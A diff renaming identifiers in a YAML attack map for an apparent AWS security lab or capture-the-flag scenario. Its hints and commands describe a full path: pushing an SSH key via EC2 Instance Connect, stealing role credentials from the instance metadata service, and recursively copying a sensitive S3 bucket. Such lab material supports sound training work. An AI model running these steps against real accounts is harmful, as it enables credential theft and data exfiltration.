@@ -4,7 +4,7 @@ attackMap:
       label: "Starting User"
       type: principal
       subType: iam-user
-      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-bucket-starting-user"
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2instanceconnect-003-to-bucket-starting-user"
       access:
         type: assumed-breach-credentials
       description: >
@@ -35,7 +35,7 @@ attackMap:
       label: "EC2 Bucket Role"
       type: principal
       subType: iam-role
-      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-bucket-ec2-bucket-role"
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2instanceconnect-003-to-bucket-ec2-bucket-role"
       description: >
         This IAM role is attached to the EC2 instance via an instance profile. By SSHing
         into the instance and querying the instance metadata service, you can obtain
@@ -47,7 +47,7 @@ attackMap:
       type: resource
       subType: s3-bucket
       isTarget: true
-      arn: "arn:aws:s3:::pl-sensitive-data-ec2-003-{account_id}-{suffix}"
+      arn: "arn:aws:s3:::pl-sensitive-data-ec2instanceconnect-003-{account_id}-{suffix}"
       description: >
         This S3 bucket contains sensitive data files. The EC2 bucket role has s3:GetObject
         and s3:ListBucket permissions on this bucket, allowing the attacker to list and
@@ -63,18 +63,18 @@ attackMap:
       hints:
         - "Generate a local SSH key pair, then call ec2-instance-connect:SendSSHPublicKey to push your public key to the instance (you need the instance ID, OS user, and availability zone). The key is only valid for 60 seconds — have your SSH command ready before pushing."
         - "Once inside the SSH session, use IMDSv2 to extract the role's temporary credentials: PUT to /latest/api/token to get a session token, then query /latest/meta-data/iam/security-credentials/<ROLE_NAME>. Export the AccessKeyId, SecretAccessKey, and Token locally and use s3:ListBucket and s3:GetObject to read the sensitive bucket."
-        - "Browse to https://pathfinding.cloud/paths/ec2-003 for full technique details."
+        - "Browse to https://pathfinding.cloud/paths/ec2instanceconnect-003 for full technique details."
       commands:
         - description: "List running EC2 instances and their attached instance profiles"
           command: "aws ec2 describe-instances --region REGION --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table"
         - description: "Get the availability zone of the target instance (required for SendSSHPublicKey)"
           command: "aws ec2 describe-instances --region REGION --instance-ids INSTANCE_ID --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text"
         - description: "Generate a temporary SSH key pair"
-          command: "ssh-keygen -t rsa -f /tmp/ec2-003-temp-key -N '' -q"
+          command: "ssh-keygen -t rsa -f /tmp/ec2instanceconnect-003-temp-key -N '' -q"
         - description: "Push the public key to the EC2 instance (valid for 60 seconds)"
-          command: "aws ec2-instance-connect send-ssh-public-key --instance-id INSTANCE_ID --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-003-temp-key.pub --availability-zone AVAILABILITY_ZONE --region REGION"
+          command: "aws ec2-instance-connect send-ssh-public-key --instance-id INSTANCE_ID --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2instanceconnect-003-temp-key.pub --availability-zone AVAILABILITY_ZONE --region REGION"
         - description: "SSH into the instance within the 60-second window"
-          command: "ssh -i /tmp/ec2-003-temp-key -o StrictHostKeyChecking=no ec2-user@INSTANCE_PUBLIC_IP"
+          command: "ssh -i /tmp/ec2instanceconnect-003-temp-key -o StrictHostKeyChecking=no ec2-user@INSTANCE_PUBLIC_IP"
 
     - from: ec2-instance
       to: ec2-role
@@ -105,8 +105,8 @@ attackMap:
         - description: "Verify the new identity"
           command: "aws sts get-caller-identity"
         - description: "List objects in the sensitive S3 bucket"
-          command: "aws s3 ls s3://pl-sensitive-data-ec2-003-{account_id}-{suffix}/"
+          command: "aws s3 ls s3://pl-sensitive-data-ec2instanceconnect-003-{account_id}-{suffix}/"
         - description: "Download objects from the S3 bucket"
-          command: "aws s3 cp s3://pl-sensitive-data-ec2-003-{account_id}-{suffix}/ /tmp/exfil/ --recursive"
+          command: "aws s3 cp s3://pl-sensitive-data-ec2instanceconnect-003-{account_id}-{suffix}/ /tmp/exfil/ --recursive"
         - description: "Retrieve the CTF flag"
-          command: "aws s3 cp s3://pl-sensitive-data-ec2-003-{account_id}-{suffix}/flag.txt -"
+          command: "aws s3 cp s3://pl-sensitive-data-ec2instanceconnect-003-{account_id}-{suffix}/flag.txt -"
